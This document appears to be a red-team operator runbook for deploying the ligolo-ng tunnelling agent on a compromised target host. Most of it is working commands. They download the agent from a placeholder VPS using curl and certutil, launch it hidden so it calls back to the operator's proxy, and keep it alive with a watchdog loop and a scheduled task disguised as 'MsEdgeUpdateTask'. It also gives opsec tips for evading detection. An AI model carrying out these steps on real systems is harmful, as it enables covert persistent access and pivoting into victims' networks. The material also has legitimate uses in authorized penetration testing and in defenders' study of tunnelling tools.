# Ligolo-ng Agent: Target-Side Relay Process

Stages and runs the ligolo-ng `agent` on a host inside `TARGET`, connects it back to the `proxy` console, and keeps that connection alive across network flaps so the operator side keeps a usable TUN relay. This document covers the target side only: architecture detection, transfer, launch, backgrounding, restart behaviour and removal. The landing console, interface and routing live in `ligolo-proxy`; the two documents are two halves of one path and are recorded as a single `tunnel` row.

## When to use

- The proxy console is already listening (`ligolo-proxy`) and needs an agent dialling in from `TARGET_IP`.
- A SOCKS pivot exists but a tool needs raw sockets, UDP or ICMP through the target network.
- You want a relay that survives loss of the initial shell: once the agent is backgrounded with `-retry`, killing the WebShell no longer kills the path.
- The target can open an arbitrary outbound TCP connection. If only HTTP egress exists, use `chisel-tunnel` with `--proxy` or `suo5-tunnel` over the WebShell instead.
- Not for a host that cannot egress at all, and not as a persistence mechanism of its own — a scheduled task or unit keeps it alive, and that is a separate decision recorded with the task.

## Prerequisites

- Agent binary for the target architecture, from `bash $DSH_HOME/redteam/setup.sh --yes` (`$DSH_HOME/redteam/toolkit/ligolo/agent`) or from the project releases. Both platforms ship as static Go binaries, so no runtime dependency is needed on the target.
- Reachable ingress: `VPS_IP:LISTEN_PORT` open in the cloud security group or the host firewall between the target and this machine.
- A working execution primitive on the target — WebShell, SSH, RDP, an existing shell — only to start the process.
- Root or `CAP_NET_ADMIN` on the target only if you intend `-tun` mode. The default relay mode needs no privilege.
- Nothing is mandatory and every alternative is acceptable. No binary transfer path works → fall back to a base64 upload through the WebShell, then `base64 -d`. No outbound TLS to `VPS_IP` → put `chisel-tunnel` in front and give the agent `-proxy http://TARGET_IP:PORT`. No ability to background a process → run it in the foreground of a `tmux` window on the target and accept the dependency. `setup.sh` unavailable → any ligolo-ng agent build of the same major version interoperates.

## Workflow

1. On the proxy side, confirm the listener is up before touching the target — an agent retrying against a closed port only produces noise in target logs.

```bash
ss -lntp | grep ':LISTEN_PORT\b'
```

2. On the target, detect architecture and available transfer tools in one pass.

```bash
uname -m; uname -s; command -v curl wget python3 base64 busybox 2>/dev/null
```

```powershell
$env:PROCESSOR_ARCHITECTURE; (Get-CimInstance Win32_OperatingSystem).OSArchitecture
Get-Command curl.exe,certutil,powershell -ErrorAction SilentlyContinue | Select-Object Name
```

3. Transfer the matching binary into a writable directory the target already uses (`/tmp`, `/dev/shm` on Linux; `C:\Windows\Temp`, `%TEMP%` on Windows).

```bash
# Linux pull
curl -fsSL -o /tmp/.agent http://VPS_IP:PORT/agent && chmod +x /tmp/.agent

# Linux push from a WebShell-only channel
base64 -w0 agent | head -c 2000000   # paste into the shell side, then:
echo '<base64 blob>' | base64 -d > /tmp/.agent && chmod +x /tmp/.agent
```

```powershell
# Windows
curl.exe -fsSL -o C:\Windows\Temp\svc.exe http://VPS_IP:PORT/agent.exe
certutil -urlcache -split -f http://VPS_IP:PORT/agent.exe C:\Windows\Temp\svc.exe
```

4. Run the agent so it dials `VPS_IP:LISTEN_PORT`. Add `-ignore-cert` for a `--selfcert` proxy, `-retry` so the loop survives a dropped connection, and `-proxy` when egress must go through an HTTP proxy.

```bash
/tmp/.agent -connect VPS_IP:LISTEN_PORT -ignore-cert -retry -v
```

```powershell
Start-Process -FilePath C:\Windows\Temp\svc.exe `
  -ArgumentList '-connect','VPS_IP:LISTEN_PORT','-ignore-cert','-retry' `
  -WindowStyle Hidden
```

5. Background it so the initial channel is disposable. Verify with `ps` that exactly one copy runs.

```bash
nohup /tmp/.agent -connect VPS_IP:LISTEN_PORT -ignore-cert -retry >/tmp/.agent.log 2>&1 &
sleep 2; ps -ef | grep -v grep | grep '\.agent'
```

```powershell
# Keep it after logoff: scheduled task owning the process
schtasks /create /tn "MsEdgeUpdateTask" /tr "C:\Windows\Temp\svc.exe -connect VPS_IP:LISTEN_PORT -ignore-cert -retry" /sc onlogon /ru "%USERNAME%" /f
schtasks /run /tn "MsEdgeUpdateTask"
```

6. Confirm the join on the proxy console and note the session line before adding routes.

```text
INFO[0004] Agent joined. name=host remote=10.10.14.7:52104
ligolo-ng » session
```

7. Only when the target must act as a router for a deeper segment and you hold root, switch to tunnel mode so the agent relays through a local interface instead of the userspace stack.

```bash
sudo /tmp/.agent -connect VPS_IP:LISTEN_PORT -ignore-cert -retry -tun
```

8. Prove the path end to end from the operator side — the agent side has no further work to do.

```bash
ping -c 2 TARGET_IP
curl -sv --max-time 5 http://TARGET_IP:PORT/ 2>&1 | head -20
```

9. If the agent drops, prefer restarting the loop over re-uploading the binary; the file is already on disk and `-retry` covers transient loss.

```bash
# Linux: watchdog that re-launches once every 30 s if absent
while true; do pgrep -f '\.agent -connect' >/dev/null || nohup /tmp/.agent -connect VPS_IP:LISTEN_PORT -ignore-cert -retry >>/tmp/.agent.log 2>&1 & sleep 30; done
```

## Output and evidence

- `RESULT_DIR/agent-launch-TARGET_IP.txt` — architecture, transfer method, exact launch command line and the resulting pid, so the path can be rebuilt verbatim.
- `RESULT_DIR/agent-TARGET_IP.log` — agent stdout/stderr; the `Agent joined` handshake and any TLS error appear here first.
- `RESULT_DIR/nmap-ligolo-TARGET_IP.txt` — the first scan that only succeeds because the agent relay is live.
- `redteam_tunnel_add` records the path once, from the proxy side: `kind=other`, `listen=VPS_IP:LISTEN_PORT`, `entry` = the launch command, `entry_kind=target-agent` (the forward runs inside a target process). `reach` carries the agent-side CIDRs. Do not add a second row for the agent itself.
- `redteam_attack_file_add` the watchdog or launcher script only after it demonstrably kept the path up, with `kind=script` and `evidence` naming the reconnect it survived.
- `redteam_asset_add` any host you reach through the agent, `provenance=active`, `tool=ligolo-ng`.
- `redteam_evidence_record` with `operation=agent_deployed`, `authority=tool-output`, `confidence=observed`, and the proxy join line inside `result`.
- `redteam_session_check` after a long idle period rewrites the live/dead state of the tunnel row instead of trusting memory.

## Failure modes

- `x509: certificate signed by unknown authority` in the agent log → the proxy uses `--selfcert` and the agent has no `-ignore-cert` → add `-ignore-cert`, or ship a CA-signed pair to the proxy.
- `dial tcp VPS_IP:LISTEN_PORT: connect: connection refused` → nothing is listening, or a firewall answers with RST → check `ss -lntp` on the proxy and the security group, and test with `nc -vz VPS_IP LISTEN_PORT` from the target.
- Agent starts and exits with no output → it was started without a terminal and without `-retry`, or it was killed by a supervisor → run with `-retry`, redirect to a log file, and read the log instead of guessing.
- `cannot execute binary file: Exec format error` → wrong architecture (`arm64` binary on `x86_64`) → re-detect with `uname -m` and fetch the matching build.
- `-tun` fails with `operation not permitted` → not root, or the kernel lacks TUN → drop `-tun` and use the default relay mode.
- Proxy logs `Agent joined` and immediately closes → the flow is being reset by an intermediary, or the binary is a truncated download → verify size with `sha256sum` against the release, and retry through `-proxy` to change the egress shape.
- Two sessions for one host after a reconnect → the old process is still running → `ps -ef | grep agent`, kill the stale pid, keep one.
- Path dies every few minutes on Windows → the scheduled task ran as a logon-scoped process and the session ended → recreate the task with `/ru "%USERNAME%"` and confirm the process survives logoff.

## Notes

- One agent per host. Duplicate agents create duplicate sessions, double the relay load and make route bookkeeping ambiguous.
- Rate: all relayed traffic is serialized through this process. Keep scans at `--min-rate RATE` and `THREADS` workers; a full-range scan through one agent shows up as sustained CPU on the target.
- Opsec: rename the binary to something the host already runs, keep it out of the target's shell history where possible, and avoid the proxy's default port when the network baseline permits a choice. `-v` is for diagnosis only — it writes connection detail to the log file you created.
- Idempotency: re-running the launch command without checking `ps` produces the duplicate-session failure above. Check first, start second.
- Resume: `-retry` re-dials indefinitely; each reconnect yields a new proxy session id and drops previously added routes, so re-add routes after a reconnect. The agent binary itself does not need to be re-uploaded.
- Cleanup: kill the pid (`kill <pid>` / `Stop-Process -Id <pid>`), delete the scheduled task (`schtasks /delete /tn "MsEdgeUpdateTask" /f`), remove the staged binary and log, then `redteam_tunnel_update` with `id` and `status=down`. Leaving the agent running keeps an inbound session alive long after the work is finished.
